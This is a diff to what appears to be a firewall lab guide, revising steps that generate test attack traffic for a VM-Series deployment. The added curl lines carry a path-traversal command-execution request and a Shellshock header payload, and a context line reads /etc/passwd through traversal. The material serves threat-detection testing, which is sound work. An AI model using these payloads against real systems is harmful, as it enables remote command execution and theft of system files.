@@ -295,14 +295,15 @@ The VM-Series secures outbound internet traffic from the spoke networks and east
     ```
 
 
-2. Attempt to download a pseudo malicious file from the internet.  Note, the file is safe and is used for threat prevention testing only.  
+2. Generate pseudo malicious traffic from `VM B` to the internet.
 
     ```
-    wget www.eicar.org/download/eicar.com.txt
+    curl -s -o /dev/null -w "%{http_code}\n" http://www.eicar.org/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh --data "echo Content-Type: text/plain; echo; uname -a" --max-time 2
+    curl -s -o /dev/null -w "%{http_code}\n" http://www.eicar.org/cgi-bin/user.sh -H "FakeHeader:() { :; }; echo Content-Type: text/html; echo ; /bin/uname -a" --max-time 2
     ```
 
 
-3. Generate pseudo malicious traffic between `VM B` and `VM A`.
+4. Generate pseudo malicious traffic between `VM B` and `VM A`.
 
     ```
     curl http://10.1.0.10/cgi-bin/../../../..//bin/cat%20/etc/passwd
@@ -311,7 +312,7 @@ The VM-Series secures outbound internet traffic from the spoke networks and east
     ```
 
 
-4. On the VM-Series, go to **Monitor → Threat** to view the threat logs.  
+5. On the VM-Series, go to **Monitor → Threat** to view the threat logs.  
 
     <img src="images/ss08.png" width="700"> 
 
